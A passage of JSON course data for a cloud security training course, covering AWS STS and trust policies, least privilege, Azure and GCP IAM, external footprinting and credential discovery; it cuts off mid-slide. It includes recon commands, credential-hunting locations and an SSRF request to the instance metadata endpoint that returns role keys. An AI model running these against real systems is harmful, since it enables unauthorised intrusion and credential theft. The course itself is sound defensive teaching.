+            "body": "The Security Token Service (STS) is the beating heart of cloud identity. It vends temporary, auto-expiring credentials. Every role assumption, every SSO login, every federated sign-in ends in an STS call.\n\nAnalogy: STS is the front desk that checks you out a time-limited visitor badge. You never keep a permanent key; you request a badge when you need one, and it expires on its own.\n\nUnderstanding STS is understanding how access actually flows in AWS."
+          },
+          {
+            "title": "Three Ways to Assume",
+            "body": "STS offers three assume APIs for three identity sources:\n- AssumeRole — an existing AWS principal assumes a role (same or cross-account).\n- AssumeRoleWithSAML — a corporate IdP user federates in via SAML.\n- AssumeRoleWithWebIdentity — an OIDC identity (Google, GitHub Actions, a Cognito user, an EKS pod) assumes a role.\n\nAll three return the same thing: temporary credentials. They differ only in how the caller proves who they are.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AssumeRole",
+                  "points": [
+                    "Caller: an AWS principal",
+                    "Same or cross-account",
+                    "The everyday case"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "WithSAML",
+                  "points": [
+                    "Caller: SAML IdP user",
+                    "Enterprise SSO federation",
+                    "Browser login"
+                  ]
+                },
+                {
+                  "label": "WithWebIdentity",
+                  "points": [
+                    "Caller: OIDC token",
+                    "GitHub Actions, EKS, Cognito",
+                    "Keyless CI/CD"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Trust Policy vs Permission Policy",
+            "body": "Every role has two policies that answer different questions:\n- Trust policy: WHO may assume this role. It names the allowed principals (and conditions like ExternalId).\n- Permission policy: WHAT the role can do once assumed.\n\nThey are independent. A role can have admin permissions but an empty trust policy (nobody can assume it, so it is harmless), or weak permissions but a wide-open trust policy (anyone can assume it). Attackers scrutinize the trust policy, because that is the door.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Trust policy",
+                  "points": [
+                    "Question: WHO may assume?",
+                    "Has a Principal field",
+                    "Attack surface = the door"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Permission policy",
+                  "points": [
+                    "Question: WHAT can it do?",
+                    "Standard identity policy",
+                    "The loot behind the door"
+                  ]
+                }
+              ]
+            },
+            "check": {
+              "question": "A role has AdministratorAccess as its permission policy and a trust policy with Principal '*'. Why is that critical?",
+              "options": [
+                "It is fine; permission policies are what matter",
+                "Any AWS principal can assume it and gain admin — the open trust policy is the vulnerability",
+                "STS will refuse to issue credentials",
+                "Only the account root can assume it"
+              ],
+              "correctIndex": 1,
+              "explanation": "Principal '*' in a trust policy means any principal is allowed to assume the role. Combined with admin permissions, that is account takeover. The trust policy is the door, and it is wide open."
+            }
+          },
+          {
+            "title": "The AssumeRole Exchange",
+            "body": "Here is the actual round trip. The caller sends an AssumeRole request naming the role ARN and a session name. STS evaluates the role's trust policy against the caller. If allowed, STS returns the temporary credential set.\n\nThe SessionToken is the extra piece temporary credentials carry that long-lived keys do not — AWS uses it to recognize the session.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Caller",
+              "rightLabel": "STS",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "AssumeRole",
+                  "payload": "RoleArn=arn:aws:iam::111122223333:role/deploy\nRoleSessionName=build-42"
+                },
+                {
+                  "direction": "left",
+                  "label": "Credentials (trust policy passed)",
+                  "payload": "AccessKeyId=ASIA...\nSecretAccessKey=...\nSessionToken=IQoJ...\nExpiration=2026-11-16T15:00:00Z"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Anatomy of Temporary Credentials",
+            "body": "Temporary credentials have four parts:\n- AccessKeyId (ASIA prefix) — public identifier.\n- SecretAccessKey — the secret for signing.\n- SessionToken — proves the credentials are a valid live session.\n- Expiration — when they die (default 1 hour for AssumeRole, up to 12 hours if configured).\n\nYou use them by setting three environment variables, then any AWS call runs as the role. get-caller-identity confirms who you now are.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=IQoJ...",
+                  "output": ""
+                },
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "{\n  \"Account\": \"111122223333\",\n  \"Arn\": \"arn:aws:sts::111122223333:assumed-role/deploy/build-42\"\n}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Role Chaining and ExternalId",
+            "body": "Role chaining is assuming one role, then using its credentials to assume another. Useful for multi-hop access, but AWS caps chained sessions at 1 hour, and chaining is a strong signal to watch for in logs.\n\nExternalId defends cross-account roles against the confused-deputy problem. When a third-party vendor assumes a role in your account, you set a shared secret ExternalId in the trust policy. Without it, an attacker who knows your role ARN could trick the vendor into assuming it. ExternalId makes the vendor prove it means to act for you specifically.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Role A",
+                  "detail": "Assume with your creds"
+                },
+                {
+                  "label": "Use A's creds",
+                  "detail": "Chain into Role B (max 1 hr)"
+                },
+                {
+                  "label": "ExternalId check",
+                  "detail": "Cross-account trust requires the shared secret"
+                },
+                {
+                  "label": "Role B session",
+                  "detail": "Act, but logged as a chained assumed-role"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Lab: AssumeRole Round-Trip, and Why It Matters",
+            "body": "In the lab 'AssumeRole Round-Trip' you create a role with a trust policy, assume it from a second principal, inspect the temporary credentials, and prove exactly what they can and cannot do.\n\nWhy it matters: STS is where cloud attacks pivot. Trust-policy abuse, missing ExternalId, over-broad web-identity trust (like a GitHub Actions 'sub' wildcard), and role chaining are all headline escalation techniques in the offensive modules ahead. If you deeply understand trust vs permission and the temporary-credential lifecycle, those attacks become obvious rather than magical."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m2-6",
+        "moduleId": "cloud-m2",
+        "number": 13,
+        "title": "Least Privilege in Practice",
+        "type": "exercise",
+        "week": 1,
+        "description": "Turns theory into a workflow for right-sizing permissions. Students use Access Analyzer and last-accessed data to strip an over-broad policy down to what is actually used.",
+        "keyPoints": [
+          "IAM Access Analyzer policy generation from CloudTrail activity",
+          "Service last-accessed data to find unused permissions",
+          "Scoping with conditions and resource ARNs instead of '*'",
+          "Managed vs inline vs customer-managed policies and maintainability",
+          "The tension: least privilege vs operational friction"
+        ],
+        "slides": [
+          {
+            "title": "What Least Privilege Means",
+            "body": "Least privilege means a principal gets exactly the permissions it needs to do its job and nothing more. Not 'probably enough,' not 'admin to be safe' — the minimal set.\n\nAnalogy: give the cleaner a key to the offices they clean, not a master key to the whole building. If that key is lost, the damage is contained.\n\nLeast privilege is the single most effective way to shrink blast radius. When a credential leaks — and they do — tight permissions decide whether it is a shrug or a breach."
+          },
+          {
+            "title": "Why It Is Hard in Reality",
+            "body": "Least privilege is easy to say and hard to do. Nobody knows up front every API an application will call, so people grant s3:* 'to be safe,' then never tighten it. Permissions accrete; they rarely get removed.\n\nThe result is the over-permissioned principal attackers love: a role with far more than it uses, full of unused escalation primitives. The fix is not guessing — it is measuring what is actually used and cutting the rest, with tooling."
+          },
+          {
+            "title": "Access Analyzer Policy Generation",
+            "body": "IAM Access Analyzer can generate a tight policy from real activity. It reads CloudTrail logs of what a principal actually did over a window and produces a policy granting only those actions on those resources.\n\nWorkflow: let the workload run normally for a representative period, then generate a policy from its CloudTrail history and use that as the starting point. You move from a guessed broad policy to an evidence-based narrow one.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Workload runs",
+                  "detail": "Over broad policy, for a representative window"
+                },
+                {
+                  "label": "CloudTrail records",
+                  "detail": "Every real API call is logged"
+                },
+                {
+                  "label": "Access Analyzer",
+                  "detail": "Generates a policy from actual activity"
+                },
+                {
+                  "label": "Review + apply",
+                  "detail": "Replace the broad policy with the scoped one"
+                }
+              ]
+            },
+            "check": {
+              "question": "What data source does IAM Access Analyzer use to generate a least-privilege policy?",
+              "options": [
+                "The principal's current policy text",
+                "CloudTrail records of the actions the principal actually performed",
+                "A random sample of all AWS APIs",
+                "The resource's tags"
+              ],
+              "correctIndex": 1,
+              "explanation": "Access Analyzer policy generation reads CloudTrail activity to see which actions and resources were actually used, then builds a policy limited to those."
+            }
+          },
+          {
+            "title": "Finding Unused Permissions",
+            "body": "IAM tracks service last-accessed data: when a principal last used each service. If a role was granted ec2:* but has not touched EC2 in 400 days, that permission is a candidate for removal.\n\nThis is a quick, low-risk win: pull last-accessed data, find services never or rarely used, and strip them. It is the fastest way to deflate an over-broad policy without breaking anything in active use.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam generate-service-last-accessed-details --arn arn:aws:iam::111122223333:role/old-batch",
+                  "output": "JobId: a1b2c3"
+                },
+                {
+                  "command": "aws iam get-service-last-accessed-details --job-id a1b2c3",
+                  "output": "- ServiceName: Amazon EC2\n  LastAuthenticated: (never)\n- ServiceName: Amazon S3\n  LastAuthenticated: '2026-11-15T09:00:00Z'"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Scope with Conditions and ARNs",
+            "body": "Two moves turn a broad grant into a tight one:\n- Replace Resource '*' with specific ARNs — one bucket, one prefix, one table.\n- Add conditions — require MFA, limit to your Organization, restrict source IP, or use tag-based access (aws:ResourceTag).\n\nInstead of 'can read any bucket,' you get 'can read objects under reports/ in this bucket, only with MFA, only from the corporate network.' Same job, far smaller blast radius."
+          },
+          {
+            "title": "Managed vs Inline Policies",
+            "body": "Three policy attachments, each with trade-offs:\n- AWS-managed: maintained by AWS (e.g. AmazonS3ReadOnlyAccess). Convenient but often broader than you need.\n- Customer-managed: you write it, reuse it across principals, version it. The recommended default for maintainability.\n- Inline: embedded in a single principal. Good for a strict one-to-one relationship, but easy to lose track of and hard to audit at scale.\n\nPrefer customer-managed policies for reuse and clear ownership; reserve inline for truly principal-specific rules.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS-managed",
+                  "points": [
+                    "AWS maintains it",
+                    "Convenient",
+                    "Often too broad"
+                  ]
+                },
+                {
+                  "label": "Customer-managed",
+                  "points": [
+                    "You own and version it",
+                    "Reusable across principals",
+                    "Best for maintainability"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Inline",
+                  "points": [
+                    "Embedded in one principal",
+                    "Strict 1:1 binding",
+                    "Hard to audit at scale"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Right-Size an Over-Broad Role",
+            "body": "A practical workflow you can run in the sandbox:\n1. Pick a role with a broad policy (e.g. PowerUserAccess or s3:*).\n2. Pull service last-accessed data to find unused services.\n3. Generate a policy from CloudTrail with Access Analyzer.\n4. Rewrite Resource '*' to specific ARNs and add an MFA or Org condition.\n5. Simulate with simulate-principal-policy to confirm real tasks still pass and escalation actions now fail.\n\nThe deliverable is a before/after diff showing dangerous permissions removed while the workload still functions."
+          },
+          {
+            "title": "The Tension, and Why It Matters",
+            "body": "Least privilege fights operational friction. Too tight and deployments break at 2 a.m.; too loose and one leaked key is game over. The craft is cutting the genuinely unused and dangerous permissions while leaving the workload working — which is exactly what the measure-then-scope workflow delivers.\n\nWhy it matters: over-permissioned principals are the fuel for the entire IAM-attacks module ahead. Every privilege-escalation primitive you will study exists because someone granted more than was needed. Least privilege is where you starve those attacks of oxygen."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m2-7",
+        "moduleId": "cloud-m2",
+        "number": 14,
+        "title": "Identity in Azure & GCP (Primer)",
+        "type": "theory",
+        "week": 1,
+        "description": "A short cross-provider bridge so the IAM mental model transfers. Entra ID and Google Cloud IAM differ in structure but share the principal/role/binding idea.",
+        "keyPoints": [
+          "Entra ID: users, service principals, managed identities, app registrations, roles",
+          "GCP: members (users/service accounts), roles, and IAM bindings on resources",
+          "GCP IAM is resource-hierarchy inherited (org -> folder -> project -> resource)",
+          "Azure RBAC role assignments scoped at management group / subscription / resource",
+          "Primitive vs predefined vs custom roles (GCP) and built-in vs custom (Azure)"
+        ],
+        "slides": [
+          {
+            "title": "One Mental Model, Three Clouds",
+            "body": "AWS IAM is the deepest, but the core idea transfers everywhere: a principal (an identity) is granted a role (a set of permissions) over some scope of resources. Azure and Google Cloud use different words and structures, yet the same shape.\n\nThis primer gives you just enough to carry your IAM instincts into Entra ID (Azure) and Google Cloud IAM, so a multi-cloud estate does not feel like three unrelated systems."
+          },
+          {
+            "title": "The Vocabulary Map",
+            "body": "The same concepts wear different names:\n- Identity: AWS principal = Azure security principal = GCP member.\n- Permission set: AWS policy = Azure role definition = GCP role.\n- Grant: AWS policy attachment = Azure role assignment = GCP IAM binding.\n\nLearn the three dialects and you can read any cloud's access model. The question is always the same: which identity has which permissions over which scope?",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "Principal (user/role)",
+                    "Policy",
+                    "Policy attachment",
+                    "Account / resource ARN"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Azure (Entra ID)",
+                  "points": [
+                    "Security principal",
+                    "Role definition",
+                    "Role assignment",
+                    "Mgmt group/sub/RG/resource"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "Member",
+                    "Role",
+                    "IAM binding",
+                    "Org/folder/project/resource"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Azure / Entra ID Identities",
+            "body": "Microsoft Entra ID (formerly Azure AD) is the identity provider; Azure RBAC governs what those identities can do to Azure resources. Key principal types:\n- Users — humans.\n- Service principals — the identity of an app or automation.\n- Managed identities — like AWS instance profiles: an Azure resource gets an auto-managed identity, no secrets to store.\n- App registrations — define an application and its permissions.\n\nManaged identities are the closest analogue to roles-on-workloads and the modern best practice."
+          },
+          {
+            "title": "GCP: Members, Roles, Bindings",
+            "body": "In Google Cloud, you grant access by binding a member to a role on a resource. Members include users and service accounts. Roles bundle permissions. The binding ties them together at a scope.\n\nCrucially, GCP IAM is inherited down a resource hierarchy: organization -> folder -> project -> resource. A binding at the project level flows to everything inside it. Grant org-level admin and it cascades to every project — a common over-grant.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "org",
+                  "label": "Organization",
+                  "highlighted": true
+                },
+                {
+                  "id": "folder",
+                  "label": "Folder"
+                },
+                {
+                  "id": "proj",
+                  "label": "Project"
+                },
+                {
+                  "id": "res",
+                  "label": "Resource (bucket/VM)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "org",
+                  "to": "folder",
+                  "label": "inherits down"
+                },
+                {
+                  "from": "folder",
+                  "to": "proj",
+                  "label": "inherits down"
+                },
+                {
+                  "from": "proj",
+                  "to": "res",
+                  "label": "inherits down"
+                }
+              ]
+            },
+            "check": {
+              "question": "In GCP, you grant a service account the Editor role bound at the organization level. What is the effect?",
+              "options": [
+                "It can edit only the organization's settings",
+                "The binding is inherited by every folder, project, and resource below, granting Editor everywhere",
+                "It applies to nothing until bound again at each project",
+                "It only affects IAM, not resources"
+              ],
+              "correctIndex": 1,
+              "explanation": "GCP IAM inherits down the hierarchy. An org-level binding cascades to all folders, projects, and resources, so org-level Editor is an estate-wide grant — a frequent over-permission."
+            }
+          },
+          {
+            "title": "Azure RBAC Scopes",
+            "body": "Azure applies role assignments at a scope, and the scope also inherits downward: management group -> subscription -> resource group -> resource. Assign Contributor at the subscription scope and it applies to every resource group and resource within.\n\nSo both Azure and GCP share AWS's lesson in a new form: the higher you grant, the wider it reaches. Always assign at the narrowest scope that does the job — the direct parallel to AWS least privilege.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Management group",
+                  "detail": "Broadest scope"
+                },
+                {
+                  "label": "Subscription",
+                  "detail": "Inherits from above"
+                },
+                {
+                  "label": "Resource group",
+                  "detail": "Inherits further"
+                },
+                {
+                  "label": "Resource",
+                  "detail": "Narrowest — assign here when possible"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Role Flavors: Primitive, Predefined, Custom",
+            "body": "Both clouds offer tiers of built-in vs tailored roles:\n- GCP: primitive roles (Owner/Editor/Viewer) are legacy and dangerously broad; predefined roles are service-scoped and recommended; custom roles let you pick exact permissions.\n- Azure: built-in roles (Owner, Contributor, Reader, and many service-specific) cover most needs; custom roles fill gaps.\n\nThe security advice mirrors AWS: avoid the broad primitives (GCP Owner/Editor, Azure Owner/Contributor) where a narrower predefined or custom role fits."
+          },
+          {
+            "title": "Why the Cross-Cloud View Matters",
+            "body": "Real organizations run more than one cloud, and attackers follow identity across all of them. The dangerous patterns rhyme: GCP service-account impersonation (actAs) echoes AWS AssumeRole; Azure managed identities echo instance profiles; over-broad bindings at a high scope echo Resource '*'.\n\nCarry one principle everywhere: identify the principal, the permission set, and the scope, then ask where it is too broad. With this primer, your AWS IAM mastery becomes a transferable skill rather than a single-vendor trick — which is exactly what the multi-cloud recon and attack modules will demand."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m3",
+    "name": "Cloud Reconnaissance & Enumeration",
+    "shortName": "Cloud Recon",
+    "month": 1,
+    "weeks": [
+      1
+    ],
+    "description": "Before attack or defence comes situational awareness. This module teaches external and authenticated enumeration of cloud estates: discovering accounts and assets from the outside, and once holding any credential, mapping the full reachable surface of identities, data stores and trust relationships.",
+    "estimatedHours": 11,
+    "outcomes": [
+      "Discover cloud footprint externally via DNS, certificate transparency, public buckets and exposed endpoints",
+      "Enumerate an AWS account from a single set of credentials to find reachable services and permissions",
+      "Build an identity and trust graph of an estate and spot the dangerous edges",
+      "Select the right open-source cloud recon tool for a given goal and read its output critically"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m3-1",
+        "moduleId": "cloud-m3",
+        "number": 15,
+        "title": "External Footprinting",
+        "type": "theory",
+        "week": 1,
+        "description": "Finding an organisation's cloud presence without any credentials. Covers passive sources that reveal buckets, endpoints and infrastructure from the public internet.",
+        "keyPoints": [
+          "Certificate Transparency logs (crt.sh) and subdomain enumeration for cloud endpoints",
+          "DNS CNAMEs revealing S3/CloudFront/Azure/GCP backends",
+          "Public bucket discovery and permutation (S3, GCS, Azure Blob naming patterns)",
+          "ASN / IP range attribution and reverse DNS for cloud-hosted assets",
+          "Public code/CI leaks: GitHub, Docker Hub, exposed .env and credentials"
+        ],
+        "slides": [
+          {
+            "title": "What External Footprinting Is",
+            "body": "External footprinting means mapping an organisation's cloud presence from the public internet using zero credentials.\n\nThink of a stranger standing on the street outside a building. Without going in, they note every door, window and loading bay they can see. That is footprinting: you catalogue the company's cloud-hosted assets - domains, API endpoints, storage buckets, IP ranges - before you ever log in.\n\nJargon check: a 'footprint' is the total set of assets an org exposes. 'Passive' recon means you only read public records, so the target never even sees your traffic. Everything in this topic is passive or very low-touch and uses data the organisation already leaked to the world."
+          },
+          {
+            "title": "The Public Breadcrumbs",
+            "body": "Clouds leave a trail of public records. You walk that trail from a single root domain outward until you have the whole estate.\n\nEach source below reveals a different slice: TLS certificates expose hostnames, DNS exposes which cloud hosts them, naming conventions expose storage, and developer carelessness exposes code and keys.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Root domain",
+                  "detail": "example.com - your single starting point"
+                },
+                {
+                  "label": "CT logs",
+                  "detail": "crt.sh lists every subdomain that ever got a cert"
+                },
+                {
+                  "label": "DNS resolve",
+                  "detail": "CNAMEs reveal S3 / CloudFront / Azure / GCP backends"
+                },
+                {
+                  "label": "Bucket guess",
+                  "detail": "permute the org name into likely bucket names"
+                },
+                {
+                  "label": "Code leaks",
+                  "detail": "GitHub / Docker Hub expose configs and keys"
+                },
+                {
+                  "label": "Asset map",
+                  "detail": "a ranked list of reachable cloud assets"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Certificate Transparency in Action",
+            "body": "Every time a site gets a TLS certificate, that certificate is published to public Certificate Transparency (CT) logs. You can read them for free. This is the single richest source of subdomains, because even internal-sounding hosts need certs.\n\ncrt.sh is a searchable front-end to those logs. The '%' is a wildcard, so '%.example.com' returns every subdomain ever certified. Many of these point straight at cloud services.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u",
+                  "output": "api.example.com\ndev-api.example.com\ns3-backups.example.com\nstaging.example.com\nvpn.example.com"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why do Certificate Transparency logs expose internal-sounding subdomains like dev-api.example.com?",
+              "options": [
+                "crt.sh brute-forces the DNS zone to guess subdomains",
+                "Every issued TLS certificate is published to public append-only CT logs, so any host that got a cert appears",
+                "The organisation must manually submit each subdomain to crt.sh",
+                "CT logs read the company's internal DNS server directly"
+              ],
+              "correctIndex": 1,
+              "explanation": "CT is a public, append-only log of issued certificates that browsers require. Getting a cert for a host leaks that host's name forever - no DNS access or brute force needed."
+            }
+          },
+          {
+            "title": "DNS Reveals the Cloud Backend",
+            "body": "Finding a hostname is step one. Resolving it tells you which cloud is behind it. A CNAME (an alias record) that points at a provider's domain is a dead giveaway.\n\nLearn the tell-tale suffixes: *.s3.amazonaws.com and *.cloudfront.net are AWS; *.blob.core.windows.net is Azure Blob; *.storage.googleapis.com is Google Cloud Storage. A dangling CNAME (pointing to a deleted bucket) is also a subdomain-takeover lead.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "dig +short s3-backups.example.com",
+                  "output": "s3-backups.example.com.s3.amazonaws.com.\n52.218.49.10"
+                },
+                {
+                  "command": "dig +short cdn.example.com",
+                  "output": "d1a2b3c4d5e6f7.cloudfront.net.\n13.33.12.45"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Bucket Discovery and Permutation",
+            "body": "Object storage is the most common cloud leak. Bucket names are often predictable, so you generate candidates from the org name and test which exist and which are public.\n\nEach provider has its own naming scheme: AWS S3 is global (example-backups.s3.amazonaws.com), Azure Blob uses account.blob.core.windows.net/container, and GCS uses storage.googleapis.com/bucket. Tools like cloud_enum and s3scanner permute prefixes and suffixes (-dev, -prod, -backups, -logs) and report open ones.\n\nNote the nuance: a bucket can exist-but-private (403), be public-listable (200 with a file index), or not exist (404). Only the open ones matter.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cloud_enum -k example -k example-corp --quickscan",
+                  "output": "[+] S3 Bucket OPEN:  http://example-backups.s3.amazonaws.com/\n[+] GCS Bucket OPEN: https://storage.googleapis.com/example-corp-dev/\n[-] Azure container example.blob.core.windows.net -> 404"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Public Code and CI Leaks",
+            "body": "Developers leak cloud assets - and sometimes live keys - into public repositories, container images and CI logs. A single .env file or a hardcoded key in git history can hand you the whole account.\n\nSearch GitHub for the org name plus terms like 'amazonaws', 'AKIA', or internal hostnames you found earlier. Scan public container images on Docker Hub for baked-in configs. Tools like trufflehog and gitleaks automate finding secret-shaped strings in commit history, not just the current files.\n\nThis slide only finds the exposure. Actually handling a found credential is the next topic - and you only ever use keys you are authorised to test."
+          },
+          {
+            "title": "How to Spot It, Defend It, and Why It Matters",
+            "body": "Spot and test it: run CT + DNS + bucket permutation + code search against a scope you own, and confirm each hit is really yours before touching it. In the module lab 'One Key, Full Map' this external pass is what precedes authenticated enumeration - you find the surface, then find the key that opens it.\n\nDefend / harden:\n- Use private buckets and 'Block Public Access' at the account level (AWS), private containers (Azure), uniform bucket-level access (GCP).\n- Fix dangling DNS records to stop subdomain takeover.\n- Enforce secret scanning (gitleaks/trufflehog) in CI to block committed keys.\n- Treat the system of record (CT logs, DNS) as public - assume every hostname is known.\n\nWhy it matters: real cloud breaches routinely start from a public bucket or a leaked key, not a zero-day. Footprinting is cheap, silent and almost never logged by the target, which is exactly why attackers do it first - and why defenders must enumerate their own footprint before someone else does."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m3-2",
+        "moduleId": "cloud-m3",
+        "number": 16,
+        "title": "Credential Discovery & Initial Access",
+        "type": "theory",
+        "week": 1,
+        "description": "How attackers obtain that first credential, which is where real cloud intrusions begin. Students learn the common leak sources and how to treat any found key responsibly in a lab.",
+        "keyPoints": [
+          "Hardcoded keys in git history (trufflehog, gitleaks) and CI/CD logs",
+          "Leaked keys in public S3 objects, AMIs, EBS snapshots and container images",
+          "SSRF-to-metadata as a credential source (previewed here, deep-dived later)",
+          "Keys in developer dotfiles, Slack, and third-party SaaS integrations",
+          "Identifying key type from the AKIA/ASIA prefix (long-lived vs temporary)"
+        ],
+        "slides": [
+          {
+            "title": "What Credential Discovery Is",
+            "body": "Credential discovery is finding that first valid cloud key - the moment an external footprint becomes an actual intrusion.\n\nAnalogy: footprinting told you where the building is and which doors exist. A credential is a key someone left under the doormat, taped to a delivery note, or dropped in the parking lot. Most cloud breaches don't pick a lock; they find a key.\n\nJargon: a 'credential' in AWS is usually an access key pair (an ID plus a secret), sometimes with a session token. 'Initial access' is the stage where an attacker first authenticates. In this lab course you only ever use keys to test an account you are authorised to assess."
+          },
+          {
+            "title": "Where Keys Leak",
+            "body": "Keys escape through a handful of recurring channels. Knowing them tells you where to look as an attacker - and where to scan as a defender.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "key",
+                  "label": "Leaked credential",
+                  "highlighted": true
+                },
+                {
+                  "id": "git",
+                  "label": "Git history / CI logs"
+                },
+                {
+                  "id": "obj",
+                  "label": "Public S3 objects / AMIs / snapshots"
+                },
+                {
+                  "id": "ssrf",
+                  "label": "SSRF -> instance metadata"
+                },
+                {
+                  "id": "dev",
+                  "label": "Dotfiles / Slack / SaaS"
+                },
+                {
+                  "id": "img",
+                  "label": "Container images"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "git",
+                  "to": "key",
+                  "label": "hardcoded"
+                },
+                {
+                  "from": "obj",
+                  "to": "key",
+                  "label": "baked in"
+                },
+                {
+                  "from": "ssrf",
+                  "to": "key",
+                  "label": "role creds"
+                },
+                {
+                  "from": "dev",
+                  "to": "key",
+                  "label": "shared"
+                },
+                {
+                  "from": "img",
+                  "to": "key",
+                  "label": "layer leak"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Finding Keys in Git History",
+            "body": "The classic leak: a developer commits a key, notices, and deletes it in a later commit. The file looks clean now, but the key still lives in git history forever. Tools like trufflehog and gitleaks walk every past commit, not just the current tree, and flag secret-shaped strings.\n\ntrufflehog goes further and 'verifies' some secrets - it does a harmless identity check (like sts:GetCallerIdentity for AWS) to tell live keys from dead ones, so you don't chase rotated junk.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "trufflehog git https://github.com/example/webapp --only-verified",
+                  "output": "Found verified result �\nDetector Type: AWS\nAccess Key: AKIAIOSFODNN7EXAMPLE\nCommit: 3f9a1c... (deleted in HEAD)\nRotation status: ACTIVE"
+                }
+              ]
+            },
+            "check": {
+              "question": "A key was committed then removed in a later commit, so 'git show HEAD' no longer contains it. Why can trufflehog still find it?",
+              "options": [
+                "trufflehog restores deleted files from the trash",
+                "It scans the full commit history, where the old blob containing the key still exists",
+                "GitHub emails the key to scanners",
+                "The key is cached in the DNS record"
+              ],
+              "correctIndex": 1,
+              "explanation": "Deleting a secret in a new commit does not erase it from history. The blob persists in earlier commits, so history-aware scanners recover it. The only real fix is rotating the key."
+            }
+          },
+          {
+            "title": "Read the Key Prefix: AKIA vs ASIA",
+            "body": "You can tell a lot from an AWS key's first four characters before you ever use it. The prefix encodes the credential type, which tells you how long it lasts and what else it needs.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AKIA... (long-lived)",
+                  "points": [
+                    "IAM user access key, no expiry",
+                    "Just ID + secret, no session token",
+                    "Valid until manually rotated/deleted",
+                    "High value: persists for attackers"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "ASIA... (temporary)",
+                  "points": [
+                    "STS session credential from AssumeRole/SSO",
+                    "Requires a SessionToken too",
+                    "Expires (minutes to hours)",
+                    "Often from metadata or a role chain"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Other Leak Sources",
+            "body": "Git is not the only place. Keys and secrets hide in artifacts people forget are shippable:\n\n- Public S3 objects: backups, config dumps, logs left world-readable.\n- AMIs and EBS snapshots shared publicly - mount them and read /home/*/.aws/credentials or baked-in user-data.\n- Container images on Docker Hub: 'docker history' and layer inspection reveal secrets added then 'deleted' in a later layer (same trap as git).\n- Developer machines: ~/.aws/credentials, ~/.azure, shell history, and secrets pasted into Slack or Jira.\n- Third-party SaaS integrations holding a scoped key that is broader than it should be.\n\nFor each, the defender lesson is identical: a secret that ever touched a shareable artifact must be considered public."
+          },
+          {
+            "title": "SSRF to Instance Metadata (Preview)",
+            "body": "One source deserves a preview because it is so common: the instance metadata service (IMDS). An EC2 instance can ask a magic link-local address, 169.254.169.254, for the temporary credentials of its attached role.\n\nIf a web app on that instance has Server-Side Request Forgery (SSRF) - you can make it fetch a URL you choose - you can make it fetch the metadata endpoint and hand you role credentials (an ASIA key). This is deep-dived in a later module; here just recognise the pattern.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker via SSRF",
+              "rightLabel": "IMDSv1 on EC2",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GET through vulnerable app",
+                  "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"
+                },
+                {
+                  "direction": "left",
+                  "label": "Temporary role creds leaked",
+                  "payload": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\",\"Expiration\":\"...\"}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Test Responsibly, Then Defend",
